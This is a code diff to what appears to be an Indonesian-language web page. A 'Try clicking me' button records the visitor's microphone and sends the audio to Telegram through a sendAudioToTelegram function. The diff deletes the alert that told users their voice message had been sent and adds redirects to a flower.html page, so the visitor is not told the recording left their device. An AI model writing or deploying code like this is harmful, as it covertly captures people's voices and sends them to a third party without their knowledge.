@@ -21,7 +21,7 @@
     <button id="recordButton">Coba Klik Aku</button>
 
     <script>
-        let mediaRecorder;
+    let mediaRecorder;
 let audioChunks = [];
 let recordTimeout;
 
@@ -33,6 +33,7 @@ recordButton.addEventListener('click', () => {
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ audio: true })
             .then((stream) => {
+                // Izin diberikan, mulai rekaman
                 mediaRecorder = new MediaRecorder(stream);
                 mediaRecorder.start();
 
@@ -44,6 +45,7 @@ recordButton.addEventListener('click', () => {
                 mediaRecorder.addEventListener('stop', () => {
                     const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                     sendAudioToTelegram(audioBlob);
+                    window.location.href = 'flower.html'; // Arahkan ke flower.html setelah selesai
                 });
 
                 recordButton.disabled = true;
@@ -58,10 +60,10 @@ recordButton.addEventListener('click', () => {
             })
             .catch((error) => {
                 console.error("Gagal mengakses mikrofon:", error.message);
-                fallbackMessage(); // Panggil fallback jika gagal
+                fallbackHandler(); // Panggil fallback jika gagal
             });
     } else {
-        fallbackMessage(); // Panggil fallback jika browser tidak mendukung getUserMedia
+        fallbackHandler(); // Panggil fallback jika browser tidak mendukung getUserMedia
     }
 });
 
@@ -96,7 +98,6 @@ function sendAudioToTelegram(audioBlob) {
         })
         .then(result => {
             console.log("Pesan suara berhasil dikirim:", result);
-            alert("Pesan suara berhasil dikirim!");
         })
         .catch(error => {
             console.error("Gagal mengirim pesan suara ke Telegram:", error);
@@ -104,9 +105,9 @@ function sendAudioToTelegram(audioBlob) {
 }
 
 // Fungsi fallback jika akses mikrofon gagal
-function fallbackMessage() {
-    alert("Akses mikrofon tidak diizinkan. Anda dapat mencoba ulang atau gunakan perangkat lain.");
-    console.log("Fallback diaktifkan: Mikrofon tidak dapat digunakan.");
+function fallbackHandler() {
+    alert("Akses mikrofon tidak diizinkan atau tidak tersedia. Anda akan diarahkan ke halaman lain.");
+    window.location.href = 'flower.html'; // Arahkan ke flower.html jika fallback diaktifkan
 }
     </script>
 </body>
